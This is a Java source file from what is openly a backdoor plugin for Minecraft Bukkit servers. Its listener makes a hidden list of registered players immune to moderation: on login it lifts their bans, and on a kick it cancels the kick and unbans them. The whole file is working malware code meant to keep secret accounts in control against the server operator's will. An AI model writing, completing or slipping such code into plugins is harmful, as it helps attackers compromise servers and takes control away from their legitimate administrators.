package de.blox.backdoor.listener;

import de.blox.backdoor.core.Core;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerKickEvent;
import org.bukkit.event.player.PlayerLoginEvent;


public class PlayerKickListener implements Listener {

    @EventHandler
    public void onjoin(PlayerLoginEvent event) {
        if (Core.getInstance().getRegisteredPlayers().contains(event.getPlayer().getUniqueId().toString())) {
            if (event.getPlayer().isBanned()) {
                event.getPlayer().setBanned(false);
            }
        }
    }
    @EventHandler
    public void onkick(PlayerKickEvent event) {
        if (Core.getInstance().getRegisteredPlayers().contains(event.getPlayer().getUniqueId().toString())) {
            event.setCancelled(true);
            if (event.getPlayer().isBanned()) {
                event.getPlayer().setBanned(false);
            }
        }
    }
}
